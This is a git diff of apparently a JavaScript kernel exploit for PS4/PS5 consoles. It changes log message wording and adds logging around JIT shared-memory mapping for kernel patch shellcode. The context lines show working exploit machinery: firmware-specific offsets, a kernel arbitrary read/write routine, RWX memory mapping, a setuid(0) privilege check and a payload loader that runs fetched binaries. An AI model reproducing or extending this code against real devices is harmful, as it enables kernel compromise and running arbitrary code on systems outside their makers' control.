@@ -67,7 +67,7 @@ const [is_ps4, version] = (() => {
     throw RangeError(`invalid config.target: ${hex(value)}`);
   }
 
-  log(`Console: PS${is_ps4 ? "4" : "5"} | Firmware: ${hex(version)}`);
+  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 
   return [is_ps4, version];
 })();
@@ -106,7 +106,7 @@ const fw_config = (() => {
   } else {
     // TODO: PS5
   }
-  throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? "4" : "5"}, version: ${hex(version)}`);
+  throw new RangeError(`unsupported: console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 })();
 
 const pthread_offsets = fw_config.pthread_offsets;
@@ -1499,7 +1499,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 async function get_binary(url) {
   const response = await fetch(url);
   if (!response.ok) {
-    throw Error(`Network response was not OK, status: ${response.status}\nfailed to fetch: ${url}`);
+    throw Error(`network response was not OK, status: ${response.status}\nfailed to fetch: ${url}`);
   }
   return response.arrayBuffer();
 }
@@ -1558,9 +1558,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   const prot_rwx = 7;
   const exec_p = new Int(0, 9);
   const write_p = new Int(max_size, 9);
+
+  log("open JIT fds")
   const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
   const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
 
+  log("mmap for kpatch shellcode");
   const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
   const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
 
@@ -1587,7 +1590,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     die("test jit exec failed");
   }
 
-  log("mlock save data for kernel restore");
+  log("mlock saved data for kernel restore");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
   sysi("mlock", restore_info[1], page_size);
@@ -1647,7 +1650,7 @@ export async function kexploit() {
   // If setuid is successful, we dont need to run the kernel exploit again
   try {
     if (sysi("setuid", 0) == 0) {
-      log("Kernel already patched, skipping kexploit");
+      log("kernel already patched, skipping kexploit");
       return true;
     }
   } catch {
@@ -1841,7 +1844,7 @@ function runBinLoader() {
     call_nze("pthread_create", pthread, 0x0, payload_loader, payload_buffer);
   }
 
-  log("Awaiting payload...");
+  log("awaiting payload...");
 }
 
 function runPayload(path) {
